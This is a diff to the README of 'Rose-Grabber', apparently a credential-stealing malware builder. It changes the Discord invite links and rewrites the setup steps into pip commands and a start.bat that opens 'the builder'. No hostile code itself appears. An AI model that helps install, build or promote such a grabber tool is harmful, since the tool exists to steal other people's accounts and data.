@@ -5,7 +5,7 @@
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
-    <a href="https://discord.gg/PaE8MBQz4K">
+    <a href="https://discord.gg/kaDQgjRhg9">
         <img src="https://img.shields.io/badge/Discord-%23da467d.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
     <br>
@@ -47,7 +47,7 @@
   ---
 </div>
 
-[Discord Server]: https://github.com/DamagingRose/Rose-Grabber/blob/main/components/assets/roseontop.jpg
+[Discord Server]: https://discord.gg/kaDQgjRhg9
 [Telegram Group]: https://t.me/+7MDF550ZlLVhYjUy
 [gumbobr0t's Telegram]: https://t.me/gumbobr0t
 [pierro on GitHub]: https://github.com/xpierroz
@@ -106,10 +106,10 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 
 ## Setup
 
-**By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
 + Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 + Extract the ZIP folder which you just downloaded.
-+ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.vbs`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.vbs).
++ Because of the new install script that is not optimized and not working at all, you now need to manually Install the requirements. To do so, open a cmd in the `components/scrapedata` dir and execute this command. **``pip uninstall crypto && pip uninstall pycryptodome && pip uninstall pycrypto && pip install -r requiremens.txt``**.
++ To start the program from now on, just double click the start script (`start.bat`) which will directly lead to the builder after successfully installing the requirements.
 
 ## Preview
 <div align="center">
